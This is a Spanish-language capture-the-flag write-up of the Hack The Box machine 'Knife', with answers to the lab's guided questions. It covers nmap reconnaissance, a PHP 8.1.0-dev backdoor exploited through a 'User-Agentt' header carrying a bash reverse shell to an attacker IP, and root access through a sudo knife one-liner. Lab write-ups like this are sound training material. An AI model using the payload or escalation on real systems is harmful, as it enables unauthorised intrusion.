#linux #easy #nmap #ping #whatweb #php810-dev dev #burpsuite #revershell #sudo-l

-------
# Guided Mode

1)¿Cuántos puertos TCP están abiertos en Knife?
	2

2)¿Qué versión de PHP se está ejecutando en el servidor web?
	8.1.0-dev

3)¿Qué cabecera de petición HTTP se puede añadir para conseguir la ejecución de código en esta versión de PHP?
	User-Agentt

4)¿Con qué usuario se ejecuta el servidor web?
	james

*La pregunta anterior era la flag de user.txt*
6)¿Cuál es la ruta completa al binario en esta máquina que James puede ejecutar como root?
	/usr/bin/knife

------------------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.242
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.10.10.242 -oN target
```


![[Knife1.png]]
![[Knife2.png]]
*TTL:* Maquina linux
*Puertos:*
	`22`[[ssh]]
	`80`HTTP

------------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.10.242/
```

![[Knife3.png]]
Nos informa que la pagina tiene php 8.1.0

-----
# Intrusion Vulnerabilidad php 8.1-dev

Interceptamos la peticion con [[burpsuite]]

![[Knife4.png]]
Ahora vamos a añadir la linea que es vulnerable de User-Agentt: y le vamos a inyectar el one liner que casi siempre usamos para la [[Reverse shell]] 
```
User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.16.7/443 0>&1"');
```

Ahora mientras estamos en escucha con [[nc -nlvp 443]], mandamos la peticion
![[Knife5.png]]

Y listo ya estamos adentro de la maquina
![[Knife6.png]]

--------
# [[Tratamiento de la TTY]]

-----
# Escalada de privilegios con [[Abuso de Sudo]]

Usamos el comando `sudo -l`

![[Knife7.png]]
Y nos indica que james puede usar el binario knife, siendo root sin otorgar contraseña

Articulo de [gtfobinds](https://gtfobins.github.io/gtfobins/knife/#sudo) donde nos indica como meter un payload desde sudo para elevar privilegios, asi que lo adaptamos a nuestra maquina
![[Knife8.png]]
```shell
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```
Y listo ya ganamos acceso como root y podemos visualizar las flags

![[Knife10.png]]

-------
# Creditos
[Exploit 49933 de searchsploit](https://www.exploit-db.com/exploits/49933) Que lo pudimos usar de referencia para entender la vulnerabilidad



